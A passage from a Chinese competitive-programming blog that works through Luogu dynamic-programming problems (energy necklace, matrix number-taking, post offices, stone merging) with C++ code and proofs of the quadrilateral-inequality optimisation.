class="comment">//合并成当前珠子时能够获得的最大能量</span></span><br><span class="line">    <span class="type">int</span> __l;<span class="comment">//左标记</span></span><br><span class="line">    <span class="type">int</span> __r;<span class="comment">//右标记</span></span><br><span class="line">    <span class="built_in">Bead</span>(<span class="type">int</span> _l=<span class="number">0</span>,<span class="type">int</span> _r=<span class="number">0</span>,<span class="type">int</span> _e=<span class="number">0</span>):__l(_l),__r(_r),__energy(_e)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">l</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">r</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setL</span><span class="params">(<span class="type">int</span> _l)</span></span>&#123;</span><br><span class="line">        __l=_l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setR</span><span class="params">(<span class="type">int</span> _r)</span></span>&#123;</span><br><span class="line">        __r=_r;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setEnergy</span><span class="params">(<span class="type">int</span> _e)</span></span>&#123;</span><br><span class="line">        __energy=_e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">energy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __energy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+<span class="built_in">to_string</span>(__l)+<span class="string">&quot;,&quot;</span>+<span class="built_in">to_string</span>(__r)+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> Bead &amp;bead)&#123;</span><br><span class="line">        os&lt;&lt;bead.<span class="built_in">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;bead[maxn][maxn];</span><br><span class="line"><span class="type">int</span> dp[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;l;</span><br><span class="line">        bead[i][i].<span class="built_in">setL</span>(l);</span><br><span class="line">        bead[i+n][i+n].<span class="built_in">setL</span>(l);</span><br><span class="line">        bead[i+n<span class="number">-1</span>][i+n<span class="number">-1</span>].<span class="built_in">setR</span>(l);</span><br><span class="line">        bead[i<span class="number">-1</span>][i<span class="number">-1</span>].<span class="built_in">setR</span>(l);</span><br><span class="line">    &#125;</span><br><span class="line">    bead[<span class="number">2</span>*n][<span class="number">2</span>*n].<span class="built_in">setR</span>(bead[<span class="number">0</span>][<span class="number">0</span>].<span class="built_in">r</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> delta=<span class="number">1</span>;delta&lt;n;++delta)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=<span class="number">2</span>*n;++i)&#123;</span><br><span class="line">            <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">            <span class="type">int</span> max_energy=<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> temp_energy=<span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> max_k=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">                </span><br><span class="line">                temp_energy=<span class="built_in">max</span>(max_energy,bead[i][k].<span class="built_in">energy</span>()+bead[k<span class="number">+1</span>][j].<span class="built_in">energy</span>()+bead[i][k].<span class="built_in">l</span>() * bead[i][k].<span class="built_in">r</span>() * bead[k<span class="number">+1</span>][j].<span class="built_in">r</span>());</span><br><span class="line">                <span class="keyword">if</span>(temp_energy&gt;max_energy)&#123;</span><br><span class="line">                    max_energy=temp_energy;</span><br><span class="line">                    max_k=k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bead[i][j].<span class="built_in">setEnergy</span>(max_energy);</span><br><span class="line">            bead[i][j].<span class="built_in">setL</span>(bead[i][max_k].<span class="built_in">l</span>());</span><br><span class="line">            bead[i][j].<span class="built_in">setR</span>(bead[max_k<span class="number">+1</span>][j].<span class="built_in">r</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="type">int</span> j=i+n<span class="number">-1</span>;</span><br><span class="line">        result=<span class="built_in">max</span>(result,bead[i][j].<span class="built_in">energy</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p1005-矩阵取数"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1005">P1005 矩阵取数</a></h2>
<p>对于一个给定的 <span class="math inline">\(n \times m\)</span>
的矩阵，矩阵中的每个元素 <span class="math inline">\(a_{i,j}\)</span>
均为非负整数。游戏规则如下：</p>
<ol type="1">
<li>每次取数时须从每行各取走一个元素，共 <span
class="math inline">\(n\)</span> 个。经过 <span
class="math inline">\(m\)</span> 次后取完矩阵内所有元素；</li>
<li>每次取走的各个元素只能是该元素所在行的行首或行尾；</li>
<li>每次取数都有一个得分值，为每行取数的得分之和，每行取数的得分 =
被取走的元素值 <span class="math inline">\(\times 2^i\)</span>，其中
<span class="math inline">\(i\)</span> 表示第 <span
class="math inline">\(i\)</span> 次取数（从 <span
class="math inline">\(1\)</span> 开始编号）；</li>
<li>游戏结束总得分为 <span class="math inline">\(m\)</span>
次取数得分之和。</li>
</ol>
<p>对于任意矩阵，可以求出取数后的最大得分。</p>
<p>由于第i次取数的权重为<span
class="math inline">\(2^i\)</span>,显然应尽量保留大数放到最后取</p>
<p>并且取第一行和第二行的数没有影响</p>
<p>因此实际上可以先解决一行内的取数问题,问题转化为:</p>
<p>m个数,第i个数是a[i],每次取数只能从头或者尾取数,第j次取数x的得分是<span
class="math inline">\(2^j\times x\)</span>,求m次取数最高得分</p>
<p>如果没有只能头尾取数的限制,显然直接m个数排序后按照从小到达的顺序取数,现在有一个只能从头或者尾取数的限制</p>
<p>暴力搜索的算法容易想到dfs(deque,level)表示当前双端队列deque,当前要取第level个数</p>
<p>但是m最大为80,这就意味着dfs的时间复杂度是<span
class="math inline">\(O(2^{80})\)</span>显然超时</p>
<p>显然要使用更吊的方法</p>
<p>设计状态: <span class="math display">\[
dp[i][j]\leftarrow要在闭区间[i,j]中取数,全部取完后最终能够得到的最大值
\]</span></p>
<p>状态转移: <span class="math display">\[
dp[i][j]=max(dp[i][j-1]+a[j][j]\times 2^k,dp[i+1][j]+a[i][i]\times 2^k)
\]</span> 其中k是第k次取数,k=n-i-j+2</p>
<p><code>dp[1][n]</code>是第1次取数</p>
<p>屑题害得考尼玛的高精度,有个🔨意思啊,没活可以咬打火机</p>
<h2 id="p4767-邮局"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P4767">P4767 邮局</a></h2>
<p>v个村庄,p个邮局</p>
<p>第i个村庄在a[i]位置</p>
<p>邮局都要建在村庄里,要求所有村庄到最近邮局的距离和最小</p>
<p>求这个最小距离和是多少</p>
<p>设计状态: <span class="math display">\[
dp[i][j]表示前i个村庄放了j个邮局,最小距离和
\]</span></p>
<p>状态转移 <span class="math display">\[
dp[i][j]=\min_{1\le k\le i}(dp[k][j-1]+w(k+1,i))
\]</span> 其中<span
class="math inline">\(w(l,r)\)</span>表示,在第l个和第r个(包括两头)村庄之间放一个邮局时,这一段上的村庄的最短距离和</p>
<p>这个玩意儿怎么求呢?</p>
<p>设<span class="math inline">\([l,r]\)</span>区间上的村庄坐标为<span
class="math inline">\(x[l],x[l+1],x[l+2],...,x[r-1],x[r]\)</span></p>
<p>假设放这个邮局的坐标为<span
class="math inline">\(x\)</span>,则问题相当于 <span
class="math display">\[
w(l,r)=min(|x-x[l]|+|x-x[l+1]|+|x-x[l+2]|+...+|x-x[r-1]|+|x-x[r]|)
\]</span> 令<span
class="math inline">\(f(x)=|x-x[l]|+|x-x[l+1]|+|x-x[l+2]|+...+|x-x[r-1]|+|x-x[r]|\)</span></p>
<p>也就是求该函数在<span
class="math inline">\([l,r]\)</span>上的最小值点</p>
<p>怎么求呢?画图观察一下,</p>
<p>如果有奇数项,比如<span
class="math inline">\(y=|x-x_1|+|x-x_2|+|x-x_3|\)</span>,这个函数必然有一个尖儿,也就是我们需要的最小值,并且这个极小值点等于
<span class="math inline">\(中位数(x_1,x_2,x_3)\)</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221223163332854.png"
alt="image-20221223163332854" />
<figcaption aria-hidden="true">image-20221223163332854</figcaption>
</figure>
<p>如果有偶数项,比如<span
class="math inline">\(y=|x-x_1|+|x-x_2|+|x-x_3|+|x-x_4|\)</span>,就没有这个尖儿,但是有一个水平的最低谷,这个最低谷介于两个中位数之间</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221223163546294.png"
alt="image-20221223163546294" />
<figcaption aria-hidden="true">image-20221223163546294</figcaption>
</figure>
<p>这就有<span class="math inline">\(w(l,r)\)</span>的求解方法了:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">w</span>(l,r):</span><br><span class="line">	mid=向下取整((l+r)/<span class="number">2</span>)</span><br><span class="line">	dist_sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> all k among [l,r]:</span><br><span class="line">		dist_sum+=<span class="built_in">abs</span>(x[k]-x[mid])</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> dist_sum;</span><br></pre></td></tr></table></figure>
<p>每次调用<span
class="math inline">\(w(l,r)\)</span>,时间复杂度都是<span
class="math inline">\(T(r-l+1)=O(n)\)</span></p>
<p>可以预处理所有的<span class="math inline">\(w(l,r)\)</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for(int l=1;l&lt;=n;++l)&#123;</span><br><span class="line">	for(int r=l;r&lt;=n;++r)&#123;</span><br><span class="line">		W[l][r]=w(l,r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>外面又套了<span class="math inline">\(O(n^2)\)</span>的循环</p>
<p>总复杂度是<span
class="math inline">\(O(n^3)\)</span>,然而n最大是3000,显然<span
class="math inline">\(O(n^3)\)</span>会超时</p>
<p>如果能给他降为<span class="math inline">\(O(n^2)\)</span>就可以了</p>
<p>这个<span class="math inline">\(w[l,r]\)</span>的求法可以继续优化</p>
<p>假设已经知道了<span
class="math inline">\(w[l,r-1]\)</span>,现在要求<span
class="math inline">\(w[l,r]\)</span> <span class="math display">\[
w[l,r]=w[l,r-1]+x[r]-x[mid(l,r)]\\
mid(l,r)=\lfloor\frac{l+r}{2}\rfloor
\]</span>
这条结论看上去很诡异,太简洁了,并且好像中位数的变动只会影响到新加入的第r个村庄,前面的[l,r-1]村庄到邮局的最近距离和仍然是使用的原来的中位数,我自己推导的式子中是有中位数的变化的</p>
<blockquote>
<p>如果<span
class="math inline">\(r-l+1\)</span>是一个奇数,那么最右边再加一个,下标中位数不变,相当于邮局位置不用改动,那么[l,r]所有的村庄到这个邮局的距离和不变,<span
class="math inline">\(w[l,r+1]=w[l,r]+|x[r+1]-x[mid]|\)</span></p>
<p>如果<span
class="math inline">\(r-l+1\)</span>是一个偶数,那么最右边再加一个,下标中位数得往右移动一个,新mid=老mid+1,那么</p>
<p><span class="math inline">\(w[l,r+1]=w[l,r]+|x[新mid]-x[老mid]|\times
(l-r+1)+|x[r+1]-x[新mid]|\)</span></p>
<p>再考虑<span
class="math inline">\(r-l+1\)</span>是奇数的情况,如果保持下标中位数不变,实际上对于[l,r+1]时,这个中位数是左中位数</p>
<p>完全可以+1使用右中位数</p>
<p>因此两种情况统一了,即 <span class="math display">\[
w[l,r+1]=w[l,r]+(x[mid+1]-x[mid])\times (r-l+1)+x[r+1]-x[mid+1]
\]</span></p>
</blockquote>
<p>然而仔细一想确实可以忽略中位数的变化.怎么想呢?</p>
<p><span class="math display">\[
\begin{aligned}
w[l,r-1]&amp;=\sum_{l\le k\le r-1}|x[k]-x[mid(l,r-1)]|\\
w[l,r]&amp;=\sum_{l\le k\le r}|x[k]-x[mid(l,r)]|\\
\end{aligned}
\]</span>
如果[l,r-1]之间有偶数个村庄,那么选取邮局建立在左中位数村庄或者右中位数村庄,甚至两者直接的地方(虽然只允许建立在村庄里),[l,r-1]所有的村庄到这个邮局的距离和都是最短的,这在图上对应水平谷底那一段</p>
<p>不妨让邮局建立在右中位数村庄,也就是<span
class="math inline">\(\lfloor\frac{l+r-1}{2}\rfloor+1\)</span></p>
<p>那么[l,r]有奇数个村庄,其中位数唯一,也就是<span
class="math inline">\(\lfloor \frac{l+r}{2}\rfloor\)</span></p>
<p>由于[l,r-1]之间有偶数个村庄,因此可以设<span
class="math inline">\(r-1-l+1=r-l=2k\)</span>带入上两式 <span
class="math display">\[
\begin{aligned}
\lfloor\frac{l+r-1}{2}\rfloor+1&amp;=\lfloor
k+l-\frac{1}{2}\rfloor+1=k+l-1+1=k+l\\
\lfloor \frac{l+r}{2}\rfloor&amp;=\lfloor k+l\rfloor=k+l
\end{aligned}
\]</span>
这就证明了[l,r]的中位数恰好是[l,r-1]的右中位数,因此两种情况可以选择同一个中位数,因此新加入r村庄的时候w[l,r]直接加上w[l,r-1],无需进行中位数的校正</p>
<p>如果[l,r-1]之间有奇数个村庄,那么只需要让[l,r]选取左中位数和[l,r-1]的中位数是一个点,同理可证</p>
<p>证毕</p>
<p>实际上证完了看这个结论很容易想,但是之前思维就太僵化了,以后记住这个结论吧</p>
<p>加上w计算的优化,加上四边形不懂事的优化</p>
<p>okk,现在dp的时间复杂度成功降到了<span
class="math inline">\(O(n^2)\)</span></p>
<p>优化后的w,其计算的时间复杂度也是<span
class="math inline">\(O(n^2)\)</span></p>
<p>总时间复杂度就是<span class="math inline">\(O(n^2)\)</span></p>
<p>应该可以通过了吧</p>
<p><del>不想写了,开摆,明天写了题解然后再看看四边形不懂事优化</del></p>
<p>阳了四天,摆了四天...</p>
<p>首先是不加四边形不等式优化的代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> v, p;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1e9</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxv = <span class="number">3010</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxp = <span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> x[maxv];</span><br><span class="line"><span class="type">int</span> w[maxv][maxv];</span><br><span class="line"><span class="type">int</span> dp[maxv][maxp];</span><br><span class="line"><span class="comment">// int s[maxv][maxp];</span></span><br><span class="line"><span class="type">int</span> s[maxv];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// cin.tie(0);</span></span><br><span class="line">    cin &gt;&gt; v &gt;&gt; p;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= v; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; x[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span>(x + <span class="number">1</span>, x + v + <span class="number">1</span>);<span class="comment">//使村庄的坐标升序排列</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化w数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>; l &lt;= v; ++l)</span><br><span class="line">    &#123;</span><br><span class="line">        w[l][l] = <span class="number">0</span>; <span class="comment">// 从l号村庄上建立邮局,到该村庄的最短邮局距离就是0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> r = l + <span class="number">1</span>; r &lt;= v; ++r)</span><br><span class="line">        &#123;</span><br><span class="line">            w[l][r] = w[l][r - <span class="number">1</span>] + x[r] - x[(l + r) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化dp数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= v; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= p; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i][j] = INF;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> j = <span class="number">1</span>; j &lt;= p; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">1</span>; i &lt;= v; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> temp_min = INF;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> k = s[i<span class="number">-1</span>]; k &lt; i; ++k)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(temp_min&gt;dp[k][j - <span class="number">1</span>] + w[k + <span class="number">1</span>][i])&#123;</span><br><span class="line">                    temp_min=dp[k][j - <span class="number">1</span>] + w[k + <span class="number">1</span>][i];</span><br><span class="line">                    s[i]=k;<span class="comment">//四边形不等式优化</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// temp_min = min(temp_min, dp[k][j - 1] + w[k + 1][i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][j] = temp_min;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// i,j遍历顺序反了,导致计算dp[i][j]时,dp[k][j-1]可能还没有经过计算</span></span><br><span class="line">    <span class="comment">//  for(auto i=1;i&lt;=v;++i)&#123;</span></span><br><span class="line">    <span class="comment">//      for(auto j=1;j&lt;=p;++j)&#123;</span></span><br><span class="line">    <span class="comment">//          int temp_min=INF;</span></span><br><span class="line">    <span class="comment">//          for(auto k=1;k&lt;i;++k)&#123;</span></span><br><span class="line">    <span class="comment">//              temp_min=min(temp_min,dp[k][j-1]+w[k+1][i]);</span></span><br><span class="line">    <span class="comment">//          &#125;</span></span><br><span class="line">    <span class="comment">//          dp[i][j]=temp_min;</span></span><br><span class="line">    <span class="comment">//      &#125;</span></span><br><span class="line">    <span class="comment">//  &#125;</span></span><br><span class="line">    cout &lt;&lt; dp[v][p];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="动态规划-四边形不等式优化">动态规划-四边形不等式优化</h2>
<p>证明及其他详细资料见<a
target="_blank" rel="noopener" href="https://github.com/luoyongjun999/code">luoyongjun999/code: code
(github.com)</a></p>
<p>区间dp的状态转移,一般长这样(以P1775石子合并为例):</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> delta=<span class="number">1</span>;delta&lt;=n;++delta)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> i=<span class="number">1</span>;i+delta&lt;=n;++i)&#123;</span><br><span class="line">        <span class="keyword">auto</span> j=i+delta;</span><br><span class="line">        <span class="type">int</span> temp_min=INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> k=i;k&lt;j;++k)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i][k]+dp[k<span class="number">+1</span>][j]&lt;temp_min)&#123;</span><br><span class="line">                temp_min=dp[i][k]+dp[k<span class="number">+1</span>][j];</span><br><span class="line">                s[i][j]=k;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[i][j]=temp_min+prefix[j]-prefix[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>三层循环,复杂度<span class="math inline">\(O(n^3)\)</span></p>
<p>使用四边形不等式优化(能够证明成立的前提下),可以将最里圈k的遍历范围从<span
class="math inline">\([i,j)\)</span>,缩减到<span
class="math inline">\([s[i][j-1],s[i+1][j]\)</span>,这个范围结合上i和j的范围能够证明,三层循环的时间复杂度实际上是<span
class="math inline">\(O(n^2)\)</span></p>
<blockquote>
<p>这里<span class="math inline">\(s[i][j]\)</span>的实际意义是,当<span
class="math inline">\(dp[i][j]=\min_{i\leq
k&lt;j}(dp[i][k]+dp[k+1][j])+\sum_{i\leq k\leq
j}a[k]\)</span>在k处取得最小值时,此时的k就作为<span
class="math inline">\(s[i][j]\)</span></p>
<p>边界条件是<span class="math inline">\(s[i][i]=i\)</span></p>
</blockquote>
<p>用法见P1775</p>
<h2 id="p1775-石子合并弱化版"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1775">P1775
石子合并（弱化版)</a></h2>
<p>一排N堆石头第i堆石头有a[i]个,合并两堆石头的得分是两堆石头的数量和</p>
<p>求最后合并只剩一堆时取得的最小得分,其中<span
class="math inline">\(N\le 300,a[i]\leq 1000\)</span></p>
<p>P1880那个题是环状的,这个是线性的</p>
<p>设计状态: <span class="math display">\[
dp[i][j]表示合并[i,j]所有的石子,获得的最小得分
\]</span> 边界条件: <span class="math display">\[
dp[i][i]=0,即合并一堆时合并个寂寞
\]</span> 状态转移: <span class="math display">\[
dp[i][j]=\min_{i\leq k&lt;j}(dp[i][k]+dp[k+1][j])+\sum_{i\leq k\leq
j}a[k]
\]</span> 前缀和优化: <span class="math display">\[
\sum_{i\leq k\leq j}a[k]=prefix[j]-prefix[i-1]\\
dp[i][j]=\min_{i\leq k&lt;j}(dp[i][k]+dp[k+1][j])+prefix[j]-prefix[i-1]
\]</span> 四边形不等式优化:</p>
<blockquote>
<p>实际上需要证明<span
class="math inline">\(dp[i][j]\)</span>,但是可以证明只要是<span
class="math inline">\(w[i][j]\)</span>满足四边形不等式,<span
class="math inline">\(dp[i][j]\)</span>也自动满足四边形不等式,</p>
<p>因此首先证明<span class="math inline">\(w[i][j]=\sum_{i\leq k\leq
j}a[k]=prefix[j]-prefix[i-1]\)</span>满足应用四边形不等式的条件,即证:</p>
<p>1.定义:对于任意<span class="math inline">\(i&lt;i+1\leq
j&lt;j+1\)</span>,都有 <span class="math display">\[
w[i][j]+w[i+1][j+1]\leq w[i][j+1]+w[i+1][j]
\]</span> 2.单调性:对于任意<span class="math inline">\(i\le i&#39;\le
j\le j&#39;\)</span>,都有 <span class="math display">\[
w[i][j&#39;]\ge w[i&#39;][j]
\]</span> 证明如下:</p>
<p>对于定义: <span class="math display">\[
w[i][j]+w[i+1][j+1]=prefix[j]-prefix[i-1]+prefix[j+1]-prefix[i]
\]</span></p>
<p><span class="math display">\[
w[i][j+1]+w[i+1][j]=prefix[j+1]-prefix[i-1]+prefix[j]-prefix[i]
\]</span></p>
<p>左=右,定义成立</p>
<p>对于单调性: <span class="math display">\[
w[i][j&#39;]-w[i&#39;][j]=prefix[j&#39;]-prefix[i-1]-prefix[j]+prefix[i&#39;-1]\\
=(prefix[j&#39;]-prefix[j])+(prefix[i&#39;-1]-preifx[i-1])
\]</span> 由于<span class="math inline">\(i\le i&#39;\le j\le
j&#39;\)</span>,并且前缀函数<span
class="math inline">\(prefix[i]\)</span>单调不减,因此上式非负,即 <span
class="math display">\[
w[i][j&#39;]\ge w[i&#39;][j]
\]</span> 证毕</p>
<p>下面就可以使用四边形不等式的性质定理优化了</p>
</blockquote>
<p><span class="math display">\[
dp[i][j]=\min_{s[i-1][j]\leq
k&lt;s[i][j+1]}(dp[i][k]+dp[k+1][j])+prefix[j]-prefix[i-1]
\]</span> 这里<span
class="math inline">\(s[i][j]\)</span>的实际意义是,当<span
class="math inline">\(dp[i][j]=\min_{i\leq
k&lt;j}(dp[i][k]+dp[k+1][j])+\sum_{i\leq k\leq
j}a[k]\)</span>在k处取得最小值时,此时的k就作为<span
class="math inline">\(s[i][j]\)</span></p>
<p>边界条件是<span class="math inline">\(s[i][i]=i\)</span></p>
<p><span
class="math inline">\(s[i][j]\)</span>的计算并不是头铁地从i到j遍历k先求<span
class="math inline">\(s[i][j]\)</span>,而是跟随dp一起求</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">310</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> 